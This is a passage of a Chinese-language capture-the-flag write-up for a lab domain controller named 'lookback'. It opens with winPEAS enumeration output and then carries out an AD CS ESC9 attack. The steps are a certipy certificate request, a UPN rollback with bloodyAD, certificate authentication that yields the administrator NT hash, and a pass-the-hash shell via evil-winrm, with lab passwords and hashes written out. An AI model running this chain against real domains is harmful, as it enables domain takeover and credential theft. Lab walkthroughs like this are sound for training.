WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2026 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 6F0C0F282C91BEA5395643FED00EDCF70F799D29                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Template           : DomainController
WINRM       172.16.55.128   5985   DC01               Enhanced Key Usages
WINRM       172.16.55.128   5985   DC01                    Client Authentication     [*] Certificate is used for client authentication!                                                                         
WINRM       172.16.55.128   5985   DC01                    Server Authentication
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:42:34 AM
WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2030 6:52:33 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 410D6DA24FEB978AA8F2EB937906B07713D5B003                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            :
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2026 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 1D487661007C25C2362E2206BF0E5E8998B005A7                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.4679832.14812446.16206242.389827.4589012.184.1.33), Major Version Number=110, Minor Version Number=0                                                                                   
WINRM       172.16.55.128   5985   DC01               Enhanced Key Usages
WINRM       172.16.55.128   5985   DC01                    Client Authentication     [*] Certificate is used for client authentication!                                                                         
WINRM       172.16.55.128   5985   DC01                    Server Authentication
WINRM       172.16.55.128   5985   DC01                    Smart Card Logon
WINRM       172.16.55.128   5985   DC01                    KDC Authentication
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home                                                                                           
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                           
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Last Access Date           User                                           Application           Document                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files                                                                                                 
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                           
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)                                                                               
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                  C:\Users\Default User
WINRM       172.16.55.128   5985   DC01                  C:\Users\Default
WINRM       172.16.55.128   5985   DC01                  C:\Users\All Users
WINRM       172.16.55.128   5985   DC01                  C:\Users\Default
WINRM       172.16.55.128   5985   DC01                  C:\Users\All Users\ntuser.pol
WINRM       172.16.55.128   5985   DC01                  C:\Users\All Users
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                            
WINRM       172.16.55.128   5985   DC01                  File Permissions "C:\Users\All Users\winPEASx64.exe": administrator  [Allow: AllAccess]                                                                
WINRM       172.16.55.128   5985   DC01                  File Permissions "C:\Users\All Users\Seatbelt.exe": administrator  [Allow: AllAccess]                                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe                                                                                     
WINRM       172.16.55.128   5985   DC01                 C:\Windows\System32\wsl.exe
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 WSL - no installed Linux distributions found.
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                    /---------------------------------------------------------------------------------\                                                                  
WINRM       172.16.55.128   5985   DC01                    |                             Do you like PEASS?                                  |                                                                  
WINRM       172.16.55.128   5985   DC01                    |---------------------------------------------------------------------------------|                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Follow on Twitter         :     @hacktricks_live                        |                                                                  
WINRM       172.16.55.128   5985   DC01                    |         Respect on HTB            :     SirBroccoli                             |                                                                  
WINRM       172.16.55.128   5985   DC01                    |---------------------------------------------------------------------------------|                                                                  
WINRM       172.16.55.128   5985   DC01                    |                                 Thank you!                                      |                                                                  
WINRM       172.16.55.128   5985   DC01                    \---------------------------------------------------------------------------------/                                                                  
WINRM       172.16.55.128   5985   DC01             
                                            
```

### think
```plain
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html                                                      
WINRM       172.16.55.128   5985   DC01             È Check for ADCS misconfigurations in the local DC registry                                                                                                 
WINRM       172.16.55.128   5985   DC01               StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.                                           
WINRM       172.16.55.128   5985   DC01               CertificateMappingMethods:  - Strong Certificate mapping enabled.                                                                                         
WINRM       172.16.55.128   5985   DC01               IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.                                                                            
WINRM       172.16.55.128   5985   DC01               szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.                                                                             
WINRM       172.16.55.128   5985   DC01             È 
WINRM       172.16.55.128   5985   DC01             If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                                                                          
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)                                                                               
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)                                                                      
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)                                                                         
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)                                                                                
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: login  (Rights: ExtendedRight)                                                                                            
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: IT-login  (Rights: ExtendedRight)                                                                                         
WINRM       172.16.55.128   5985   DC01               [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).  
```

| **ESC9** | `StrongCertificateBindingEnforcement`<br/> 为 0（弱映射） | ✅ 可配合改名账户利用 |
| --- | --- | --- |


## ESC9
### 申请证书
> 已经改过名的Administrator 身份申请 `User` 证书
>
> 改名方法见Bad Ending-证书欺诈
>

```bash
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# certipy req -u 'administrator @lookback.htb' -p 'ITLogin!2026#Qw' -dc-ip 172.16.55.128 \
  -target dc01.lookback.htb -ca lookback-DC01-CA -template User \
  -out /home/kali/Desktop/hmv/lookback/adminspace_user_direct_20260411
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.55.128@53 answered The DNS operation timed out.; Server Do53:172.16.55.128@53 answered The DNS operation timed out.; Server Do53:172.16.55.128@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'IT-login-user@lookback.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to '/home/kali/Desktop/hmv/lookback/adminspace_user_direct_20260411.pfx'
[*] Wrote certificate and private key to '_home_kali_Desktop_hmv_lookback_adminspace_user_direct_20260411.pfx'
```

### 回滚UPN
回滚受控账号 UPN（SID `...-1112`）

```bash
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u IT-admin -p 'V9bT6itAdmin2026' set object S-1-5-21-3830242231-3868280746-2763890440-1112 userPrincipalName -v IT-login-user@lookback.htb
[+] S-1-5-21-3830242231-3868280746-2763890440-1112's userPrincipalName has been updated
```

### 同步时间
```bash
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# nmap -Pn -p445 --script smb2-time 172.16.55.128

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 07:19 +0000
Nmap scan report for dc01.lookback.htb (172.16.55.128)
Host is up (0.00016s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:2F:A0:3B (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-time: 
|   date: 2026-04-11T07:27:19
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
                                                                                                        
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# date -s '2026-04-11 07:27:30'      
2026年 04月 11日 星期六 07:27:30 UTC
```

### 认证证书
```bash
┌──(web)─(root㉿kali)-[/home/…/Desktop/hmv/lookback/myself]
└─# proxychains -q certipy auth -pfx /home/kali/Desktop/hmv/lookback/_home_kali_Desktop_hmv_lookback_adminspace_user_direct_20260411.pfx -dc-ip 172.16.55.128
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@lookback.htb'
[*] Using principal: 'administrator@lookback.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lookback.htb': aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34
```

## evil-winrm
```bash
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q evil-winrm -i 172.16.55.128 -u administrator -H 'bbabdc192282668fe5190ab0c5150b34'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Getflag
![](/image/qq%20group/lookback-8.png)

